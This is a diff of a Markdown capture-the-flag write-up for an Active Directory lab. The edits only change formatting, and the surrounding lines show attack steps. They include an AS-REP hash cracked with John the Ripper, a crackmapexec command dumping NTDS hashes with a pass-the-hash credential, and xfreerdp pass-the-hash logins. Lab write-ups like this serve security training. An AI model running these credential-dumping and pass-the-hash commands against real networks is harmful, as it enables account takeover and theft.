@@ -248,7 +248,7 @@ $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:5074d38e8727870e0a5716559eee4785$56dab19
 
 ```
 
-###Joh The Ripper
+### Joh The Ripper
 
 ```
 ❯ john hash --wordlist=passwordlist.txt
@@ -430,7 +430,9 @@ rpcclient $> queryuser 0x641
 ```
 
 > enumdomusers
+
 > enumdomgroups
+
 > querygroupmem
 
 ------
@@ -575,6 +577,7 @@ Ethernet adapter Ethernet:
 
 ### crackmapexec ntds
 
+```
 ❯ crackmapexec smb spookysec.local -u "a-spooks" -H "0e0363213e37b94221497260b0bcb4fc" --ntds vss
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  [*] Windows 10.0 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False)
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] spookysec.local\a-spooks 0e0363213e37b94221497260b0bcb4fc (Pwn3d!)
@@ -649,6 +652,7 @@ SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:aes2
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
 SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] Dumped 69 NTDS hashes to /home/noroot/.cme/logs/ATTACKTIVEDIREC_10.10.191.145_2021-08-10_012906.ntds of which 17 were added to the database
+```
 
 ### secretsdump
 
@@ -736,7 +740,8 @@ ATTACKTIVEDIREC$:des-cbc-md5:1625a7264c8a32b6
 
 # CONEXION VIA RDP
 
-❯ xfreerdp /u:Administrator /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
-❯ xfreerdp /u:a-spooks /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
+> ❯ xfreerdp /u:Administrator /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
+
+> ❯ xfreerdp /u:a-spooks /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
 
 ![desktop](/assets/imgs/attacktive-directory/desktop.png)
